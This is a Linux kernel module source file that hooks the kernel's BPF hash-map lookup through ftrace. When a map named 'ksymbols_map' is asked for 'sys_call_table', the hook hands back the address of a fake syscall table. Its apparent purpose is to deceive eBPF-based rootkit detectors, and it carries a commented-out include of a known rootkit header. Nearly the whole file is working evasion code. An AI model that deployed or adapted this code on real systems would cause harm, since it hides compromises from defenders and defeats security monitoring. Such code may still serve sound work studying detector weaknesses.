#include <linux/bpf.h>
#include <linux/btf.h>
#include <uapi/linux/btf.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/namei.h>

#include "bpf/hashtab.h"
#include "ftrace_helper.h"
#include "hooks.h"
// #include "diamorphine.h"

static void *(*orig_htab_map_lookup_elem)(struct bpf_map *map, void *key);

int compare_map_name(const char *map_name){
	// This function compares the map name to the string "ksymbols_map"

	const char ksymbols_map[] = "ksymbols_map";
	return strncmp(map_name, ksymbols_map, strlen(ksymbols_map));
}

int compare_key_name(const char *key_name){
	// This function compares the map name to the string "ksymbols_map"

	const char sys_call_table[] = "sys_call_table";
	return strncmp(key_name, sys_call_table, sizeof(sys_call_table));
}
 
static void *hook_htab_map_lookup_elem(struct bpf_map *map, void *key)
{
	/*
		This fucntion hooks the kernel function `__htab_map_lookup_elem`.
		It searches for a lookup to a specific map: `ksymbols_map` 
			and a specific key in it: `sys_call_table`.
		If it hooks this call it returns an address to a fake Syscalls table,
		else, it continues to the original function and perform a normal lookup. 
	*/

    char* key_name = (char *)key;

	char map_name[BPF_OBJ_NAME_LEN];
	strncpy(map_name, map->name, BPF_OBJ_NAME_LEN);

	// Check if the hooked map is the one we're looking for
    if ( compare_map_name(map_name) == 0 && compare_key_name(key_name) == 0) {

        struct htab_elem *l = orig_htab_map_lookup_elem(map, key);

        if (l){
			// The hash table value hides right after the key in htab_elem
            unsigned long *syscall_table_addr = (unsigned long *)(l->key + round_up(map->key_size, 8));
		    extern unsigned long *fake_sys_call_table_addr;

		    pr_info("The original syscall_table_addr from map: %p But %p returned\n", *syscall_table_addr, *fake_sys_call_table_addr);
	    	// return (void *)fake_sys_call_table_addr;
			return *fake_sys_call_table_addr;
		}
    }

    return orig_htab_map_lookup_elem(map, key);
}

static struct ftrace_hook hooks[] = {
    HOOK("__htab_map_lookup_elem", hook_htab_map_lookup_elem, &orig_htab_map_lookup_elem),
};

inline int register_hooks(void)
{
    return fh_install_hooks(hooks, ARRAY_SIZE(hooks));
}

inline void unregister_hooks(void)
{
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}